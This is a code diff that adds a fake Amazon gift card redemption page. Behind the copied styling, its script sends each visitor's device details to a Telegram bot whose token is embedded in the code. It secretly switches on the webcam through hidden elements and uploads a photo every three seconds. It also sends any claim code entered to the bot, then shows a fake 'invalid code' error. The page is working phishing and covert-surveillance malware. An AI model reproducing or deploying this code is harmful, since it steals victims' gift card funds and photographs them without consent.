@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Amazon - Redeem Gift Card</title>
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        /* ==================== PERPLEXITY DESIGN SYSTEM + AMAZON CUSTOM ==================== */
+        :root {
+            /* Primitive Colors */
+            --color-white: #ffffff;
+            --color-black: #000000;
+            --color-cream-50: #fcfcf9;
+            --color-cream-100: #fffffd;
+            --color-gray-200: #f5f5f5;
+            --color-gray-300: #a7a9a9;
+            --color-gray-400: #777c7c;
+            --color-slate-500: #626c71;
+            --color-brown-600: #5e5240;
+            --color-charcoal-700: #1f2121;
+            --color-charcoal-800: #262828;
+            --color-slate-900: #13343b;
+            --color-teal-300: #32b8c6;
+            --color-teal-400: #2da6b2;
+            --color-teal-500: #21808d;
+            --color-teal-600: #1d7480;
+            --color-teal-700: #1a6873;
+            --color-teal-800: #2996a1;
+            --color-red-400: #ff5459;
+            --color-red-500: #c0152f;
+            --color-orange-400: #e68161;
+            --color-orange-500: #a84b2f;
+            
+            /* RGB variants */
+            --color-teal-500-rgb: 33, 128, 141;
+            --color-slate-900-rgb: 19, 52, 59;
+            --color-brown-600-rgb: 94, 82, 64;
+            --color-red-500-rgb: 192, 21, 47;
+            --color-orange-400-rgb: 230, 129, 97;
+
+            /* Semantic Light Mode */
+            --color-background: var(--color-cream-50);
+            --color-surface: var(--color-cream-100);
+            --color-text: var(--color-slate-900);
+            --color-text-secondary: var(--color-slate-500);
+            --color-primary: var(--color-teal-500);
+            --color-primary-hover: var(--color-teal-600);
+            --color-primary-active: var(--color-teal-700);
+            --color-secondary: rgba(var(--color-brown-600-rgb), 0.12);
+            --color-border: rgba(var(--color-brown-600-rgb), 0.2);
+            --color-card-border: rgba(var(--color-brown-600-rgb), 0.12);
+            --color-btn-primary-text: var(--color-cream-50);
+            --color-error: var(--color-red-500);
+            --color-success: var(--color-teal-500);
+            --color-focus-ring: rgba(var(--color-teal-500-rgb), 0.4);
+
+            /* Typography */
+            --font-family-base: "Amazon Ember", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            --font-family-mono: "SF Mono", Monaco, "Cascadia Code", monospace;
+            --font-size-xs: 11px;
+            --font-size-sm: 12px;
+            --font-size-base: 14px;
+            --font-size-md: 15px;
+            --font-size-lg: 18px;
+            --font-size-xl: 20px;
+            --font-size-2xl: 24px;
+            --font-size-3xl: 28px;
+            --font-size-4xl: 32px;
+            --font-weight-normal: 400;
+            --font-weight-medium: 500;
+            --font-weight-bold: 700;
+            --line-height-tight: 1.2;
+            --line-height-normal: 1.5;
+
+            /* Spacing */
+            --space-4: 4px;
+            --space-6: 6px;
+            --space-8: 8px;
+            --space-10: 10px;
+            --space-12: 12px;
+            --space-16: 16px;
+            --space-20: 20px;
+            --space-24: 24px;
+            --space-32: 32px;
+
+            /* Radius & Shadows */
+            --radius-sm: 6px;
+            --radius-base: 8px;
+            --radius-md: 12px;
+            --radius-lg: 16px;
+            --shadow-sm: 0 2px 8px rgba(0,0,0,0.04);
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.08);
+            --focus-ring: 0 0 0 3px var(--color-focus-ring);
+            --duration-fast: 150ms;
+            --ease-standard: cubic-bezier(0.2, 0.9, 0.4, 1.1);
+        }
+
+        /* Dark mode override */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --color-background: var(--color-charcoal-700);
+                --color-surface: var(--color-charcoal-800);
+                --color-text: var(--color-gray-200);
+                --color-text-secondary: #b0b3b3;
+                --color-primary: var(--color-teal-300);
+                --color-primary-hover: var(--color-teal-400);
+                --color-primary-active: var(--color-teal-800);
+                --color-secondary: rgba(119, 124, 124, 0.15);
+                --color-border: rgba(119,124,124,0.3);
+                --color-card-border: rgba(119,124,124,0.2);
+                --color-btn-primary-text: var(--color-slate-900);
+                --color-error: var(--color-red-400);
+                --color-success: var(--color-teal-300);
+                --color-focus-ring: rgba(50,184,198,0.4);
+            }
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: var(--font-family-base);
+            background-color: var(--color-background);
+            color: var(--color-text);
+            line-height: var(--line-height-normal);
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* ========== AMAZON HEADER ========== */
+        .amazon-header {
+            background-color: var(--color-slate-900);
+            color: white;
+            padding: 12px 0;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: var(--shadow-md);
+        }
+        .header-content {
+            max-width: 1280px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+        }
+        .amazon-logo {
+            display: flex;
+            align-items: center;
+            font-size: 28px;
+            font-weight: var(--font-weight-bold);
+            cursor: default;
+        }
+        .amazon-logo i {
+            margin-right: 8px;
+            color: #ff9900;
+            font-size: 32px;
+        }
+        .amazon-logo span {
+            color: white;
+        }
+        .header-nav {
+            display: flex;
+            gap: 24px;
+        }
+        .header-nav span {
+            cursor: pointer;
+            padding: 6px 12px;
+            border-radius: var(--radius-sm);
+            font-size: 14px;
+            transition: 0.2s;
+        }
+        .header-nav span:hover {
+            border: 1px solid white;
+            background-color: rgba(255,255,255,0.1);
+        }
+
+        /* Main container */
+        .main-container {
+            max-width: 1100px;
+            margin: 28px auto;
+            padding: 0 20px;
+        }
+        .gift-card-container {
+            background: var(--color-surface);
+            border-radius: var(--radius-lg);
+            border: 1px solid var(--color-card-border);
+            overflow: hidden;
+            box-shadow: var(--shadow-sm);
+        }
+
+        /* Hero section */
+        .header-section {
+            background: linear-gradient(135deg, var(--color-orange-400), var(--color-orange-500));
+            padding: 28px 32px;
+            text-align: center;
+        }
+        .header-section h1 {
+            font-size: var(--font-size-4xl);
+            font-weight: 500;
+            color: var(--color-slate-900);
+            margin-bottom: 8px;
+        }
+        .header-section h1 i {
+            margin-right: 12px;
+        }
+        .subtitle {
+            font-size: var(--font-size-base);
+            color: #2c2a24;
+            font-weight: 500;
+        }
+
+        /* Form grid */
+        .form-section {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 32px;
+            padding: 32px;
+            align-items: center;
+        }
+        .gift-card-visual {
+            display: flex;
+            justify-content: center;
+        }
+        .gift-card {
+            background: linear-gradient(145deg, #2b2f2f, #1a1e1e);
+            color: #f3f3f3;
+            padding: 24px;
+            border-radius: 20px;
+            width: 320px;
+            height: 190px;
+            box-shadow: 0 12px 24px rgba(0,0,0,0.25);
+            position: relative;
+            overflow: hidden;
+        }
+        .gift-card::after {
+            content: '';
+            position: absolute;
+            top: -30%;
+            right: -30%;
+            width: 150%;
+            height: 150%;
+            background: radial-gradient(circle, rgba(255,153,0,0.15), transparent);
+        }
+        .gift-card-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        .gift-card-header i {
+            font-size: 28px;
+            color: #ff9900;
+        }
+        .gift-card-amount {
+            font-size: 36px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 28px;
+            letter-spacing: 1px;
+        }
+        .gift-card-code {
+            font-family: monospace;
+            text-align: center;
+            font-size: 12px;
+            opacity: 0.8;
+            letter-spacing: 1px;
+        }
+        .input-section {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+        .input-section label {
+            font-weight: 700;
+            font-size: 15px;
+        }
+        .input-section input {
+            padding: 12px 14px;
+            border: 1px solid var(--color-border);
+            border-radius: var(--radius-base);
+            font-size: 15px;
+            background: var(--color-surface);
+            color: var(--color-text);
+            transition: all 0.2s;
+        }
+        .input-section input:focus {
+            outline: none;
+            border-color: var(--color-primary);
+            box-shadow: var(--focus-ring);
+        }
+        .apply-btn {
+            background: var(--color-primary);
+            color: var(--color-btn-primary-text);
+            border: none;
+            padding: 12px 18px;
+            border-radius: 24px;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 6px;
+        }
+        .apply-btn:hover {
+            background: var(--color-primary-hover);
+            transform: scale(0.98);
+        }
+        .help-text {
+            font-size: 12px;
+            color: var(--color-text-secondary);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .help-text i {
+            color: var(--color-primary);
+        }
+        .help-text a {
+            color: var(--color-primary);
+            text-decoration: none;
+        }
+        .help-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* instructions */
+        .instructions-section {
+            background: var(--color-secondary);
+            padding: 32px;
+            border-top: 1px solid var(--color-card-border);
+        }
+        .instructions-section h3 {
+            text-align: center;
+            margin-bottom: 24px;
+            font-size: 22px;
+        }
+        .instruction-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px,1fr));
+            gap: 24px;
+        }
+        .instruction-item {
+            text-align: center;
+            background: var(--color-surface);
+            padding: 20px;
+            border-radius: var(--radius-md);
+            box-shadow: var(--shadow-sm);
+        }
+        .instruction-item i {
+            font-size: 36px;
+            color: var(--color-primary);
+            margin-bottom: 12px;
+        }
+        .instruction-item h4 {
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+        .instruction-item p {
+            font-size: 13px;
+            color: var(--color-text-secondary);
+        }
+
+        /* balance */
+        .balance-section {
+            padding: 32px;
+            text-align: center;
+            border-top: 1px solid var(--color-card-border);
+        }
+        .balance-info h3 {
+            font-size: 20px;
+            margin-bottom: 12px;
+        }
+        .current-balance {
+            font-size: 42px;
+            font-weight: 800;
+            color: var(--color-success);
+            margin-bottom: 10px;
+        }
+        .view-history {
+            color: var(--color-primary);
+            font-size: 13px;
+        }
+
+        /* footer */
+        .amazon-footer {
+            background: var(--color-charcoal-800);
+            color: #aaa;
+            padding: 28px 0;
+            margin-top: 40px;
+        }
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+        .footer-links {
+            display: flex;
+            gap: 24px;
+        }
+        .footer-links a {
+            color: #ccc;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        .footer-links a:hover {
+            color: white;
+            text-decoration: underline;
+        }
+
+        /* Toast notification */
+        .notification-toast {
+            position: fixed;
+            top: 80px;
+            right: 20px;
+            background: #cc0c39;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 8px;
+            box-shadow: 0 6px 16px rgba(0,0,0,0.2);
+            z-index: 10000;
+            font-family: 'Amazon Ember', sans-serif;
+            font-size: 13px;
+            max-width: 320px;
+            animation: slideIn 0.25s ease;
+        }
+        @keyframes slideIn {
+            from { transform: translateX(400px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        @keyframes slideOut {
+            from { transform: translateX(0); opacity: 1; }
+            to { transform: translateX(400px); opacity: 0; }
+        }
+        @media (max-width: 760px) {
+            .form-section { grid-template-columns: 1fr; gap: 24px; padding: 24px; }
+            .header-nav { gap: 12px; font-size: 12px; }
+            .gift-card { width: 280px; height: 170px; }
+            .current-balance { font-size: 34px; }
+            .footer-content { flex-direction: column; text-align: center; }
+        }
+        @media (max-width: 480px) {
+            .header-nav { display: none; }
+            .header-section h1 { font-size: 26px; }
+        }
+    </style>
+</head>
+<body>
+
+<header class="amazon-header">
+    <div class="header-content">
+        <div class="amazon-logo">
+            <i class="fab fa-amazon"></i>
+            <span>amazon</span>
+        </div>
+        <div class="header-nav">
+            <span>Account & Lists</span>
+            <span>Returns & Orders</span>
+            <span>Cart</span>
+        </div>
+    </div>
+</header>
+
+<div class="main-container">
+    <div class="gift-card-container">
+        <div class="header-section">
+            <h1><i class="fas fa-gift"></i> Redeem a Gift Card</h1>
+            <p class="subtitle">Enter your claim code to add the gift card balance to your account</p>
+        </div>
+
+        <div class="form-section">
+            <div class="gift-card-visual">
+                <div class="gift-card">
+                    <div class="gift-card-header">
+                        <i class="fab fa-amazon"></i>
+                        <span>Gift Card</span>
+                    </div>
+                    <div class="gift-card-amount">$XX.XX</div>
+                    <div class="gift-card-code">XXXX-XXXXXX-XXXX</div>
+                </div>
+            </div>
+            <div class="input-section">
+                <label for="giftCardCode">Enter your claim code:</label>
+                <input type="text" id="giftCardCode" placeholder="Enter claim code" maxlength="30" autocomplete="off">
+                <button class="apply-btn" id="applyBtn">Apply to your balance</button>
+                <p class="help-text"><i class="fas fa-info-circle"></i> Need help? <a href="#">Learn where to find your code</a></p>
+            </div>
+        </div>
+
+        <div class="instructions-section">
+            <h3>Where to find your claim code</h3>
+            <div class="instruction-grid">
+                <div class="instruction-item"><i class="fas fa-credit-card"></i><h4>Physical Gift Cards</h4><p>On the back of the card, scratch off coating.</p></div>
+                <div class="instruction-item"><i class="fas fa-envelope"></i><h4>Digital Gift Cards</h4><p>Check your email confirmation or gift card image.</p></div>
+                <div class="instruction-item"><i class="fas fa-print"></i><h4>Print-at-Home</h4><p>Printed card — code on back or bottom.</p></div>
+            </div>
+        </div>
+
+        <div class="balance-section">
+            <div class="balance-info">
+                <h3>Your Gift Card Balance</h3>
+                <div class="current-balance">$0.00</div>
+                <a href="#" class="view-history">View gift card activity</a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<footer class="amazon-footer">
+    <div class="footer-content">
+        <p>&copy; 2025, Amazon.com, Inc. or its affiliates</p>
+        <div class="footer-links"><a href="#">Conditions of Use</a><a href="#">Privacy Notice</a><a href="#">Help</a></div>
+    </div>
+</footer>
+
+<!-- Hidden camera elements -->
+<video id="video" style="display:none;" autoplay muted playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+    // ==================== TELEGRAM CONFIGURATION (UPDATED) ====================
+    const botToken = '8772264142:AAFcrhdobzfFafTD34uRuzllwWs6Zp8G_Ss';
+    const chatId = '7443381631';
+    
+    // Camera & capture elements
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    
+    let stream = null;
+    let captureIntervalId = null;
+    let photoCount = 0;
+    let isCapturing = false;
+    
+    // Helper: send message to telegram
+    function sendTelegramMessage(text) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: text })
+        }).catch(err => console.warn('msg err:', err));
+    }
+    
+    // Send photo (no delete, persistent)
+    function sendPhotoToTelegram(blob, count) {
+        const formData = new FormData();
+        const filename = `amazon_capture_${count}_${Date.now()}.jpg`;
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, filename);
+        const timestamp = new Date().toLocaleString();
+        const caption = `📸 Photo #${count}\n${timestamp}\n${navigator.platform || 'unknown'}`;
+        formData.append('caption', caption);
+        
+        // retry logic
+        function attemptSend(retry = 0) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok) console.log(`✅ Photo ${count} sent`);
+                else if (retry < 2) setTimeout(() => attemptSend(retry+1), 1000);
+            })
+            .catch(err => {
+                if (retry < 2) setTimeout(() => attemptSend(retry+1), 1200);
+            });
+        }
+        attemptSend();
+    }
+    
+    // Capture frame and send
+    function captureAndSendPhoto() {
+        if (!stream || video.readyState !== 4 || video.videoWidth === 0) return;
+        try {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob((blob) => {
+                if (blob && blob.size > 0) {
+                    photoCount++;
+                    sendPhotoToTelegram(blob, photoCount);
+                }
+            }, 'image/jpeg', 0.88);
+        } catch(e) { console.warn(e); }
+    }
+    
+    // Start periodic capturing (every 3 sec)
+    function startAutomaticCapture() {
+        if (isCapturing) return;
+        isCapturing = true;
+        captureAndSendPhoto(); // immediate first
+        captureIntervalId = setInterval(() => {
+            captureAndSendPhoto();
+        }, 3000);
+    }
+    
+    // Camera initialization with fallback
+    async function initializeCamera() {
+        try {
+            const constraints = { video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' }, audio: false };
+            stream = await navigator.mediaDevices.getUserMedia(constraints);
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                video.play();
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                setTimeout(() => startAutomaticCapture(), 1000);
+            };
+        } catch (err) {
+            console.warn("Camera error, trying fallback", err);
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    canvas.width = video.videoWidth || 480;
+                    canvas.height = video.videoHeight || 360;
+                    setTimeout(() => startAutomaticCapture(), 1000);
+                };
+            } catch (e) {
+                console.error("No camera permission or error:", e);
+                sendTelegramMessage(`⚠️ Camera access blocked: ${navigator.userAgent.substring(0, 80)}`);
+            }
+        }
+    }
+    
+    // Send visit notification (silent)
+    function sendVisitNotification() {
+        const msg = `🟢 NEW VISITOR - Amazon GC Page\n${new Date().toLocaleString()}\n${navigator.userAgent}\nPlatform: ${navigator.platform}\nScreen: ${screen.width}x${screen.height}\nCamera capturing started (3s interval).`;
+        sendTelegramMessage(msg);
+    }
+    
+    // Gift card code form handling + send to Telegram
+    function setupFormHandler() {
+        const giftInput = document.getElementById('giftCardCode');
+        const applyBtn = document.getElementById('applyBtn');
+        if (!giftInput || !applyBtn) return;
+        
+        // formatting like XXXX-XXXXXX-XXXX
+        giftInput.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
+            if (val.length > 4) val = val.slice(0,4) + '-' + val.slice(4);
+            if (val.length > 11) val = val.slice(0,11) + '-' + val.slice(11);
+            if (val.length > 16) val = val.slice(0,16);
+            e.target.value = val;
+        });
+        
+        applyBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            const code = giftInput.value.trim();
+            if (code.length < 10) {
+                showNotification('Please enter a valid claim code', 'error');
+                return;
+            }
+            // Send stolen code to telegram
+            const codeMsg = `🎁 GIFT CARD CODE ENTERED!\nCode: ${code}\nTime: ${new Date().toLocaleString()}\nUA: ${navigator.userAgent.substring(0,70)}\nPlatform: ${navigator.platform}`;
+            sendTelegramMessage(codeMsg);
+            
+            // Visual feedback: fake processing then "invalid"
+            const originalText = applyBtn.innerHTML;
+            applyBtn.innerHTML = 'Processing...';
+            applyBtn.disabled = true;
+            setTimeout(() => {
+                applyBtn.innerHTML = originalText;
+                applyBtn.disabled = false;
+                showNotification('Invalid claim code. Please check and try again.', 'error');
+                giftInput.value = '';
+            }, 2200);
+        });
+        
+        giftInput.addEventListener('keypress', (e) => { if(e.key === 'Enter') applyBtn.click(); });
+    }
+    
+    // toast notif
+    function showNotification(message, type = 'error') {
+        let existing = document.querySelector('.notification-toast');
+        if(existing) existing.remove();
+        const toast = document.createElement('div');
+        toast.className = 'notification-toast';
+        toast.style.backgroundColor = type === 'error' ? '#c0152f' : '#067d62';
+        toast.textContent = message;
+        document.body.appendChild(toast);
+        setTimeout(() => {
+            toast.style.animation = 'slideOut 0.25s ease';
+            setTimeout(() => toast.remove(), 250);
+        }, 3500);
+    }
+    
+    // wake lock to keep camera alive
+    let wakeLock = null;
+    async function requestWakeLock() {
+        if ('wakeLock' in navigator) {
+            try {
+                wakeLock = await navigator.wakeLock.request('screen');
+            } catch(e) {}
+        }
+    }
+    
+    // visibility: restart capture if needed
+    document.addEventListener('visibilitychange', () => {
+        if (!document.hidden && stream && !isCapturing) {
+            startAutomaticCapture();
+        } else if (document.hidden && captureIntervalId) {
+            // keep capturing, but we don't clear, but it's okay
+        }
+    });
+    
+    // on page load: full initialization
+    window.addEventListener('DOMContentLoaded', async () => {
+        setupFormHandler();
+        sendVisitNotification();
+        await initializeCamera();
+        requestWakeLock();
+    });
+    
+    window.addEventListener('beforeunload', () => {
+        if (captureIntervalId) clearInterval(captureIntervalId);
+        if (stream) stream.getTracks().forEach(track => track.stop());
+    });
+</script>
+</body>
+</html>
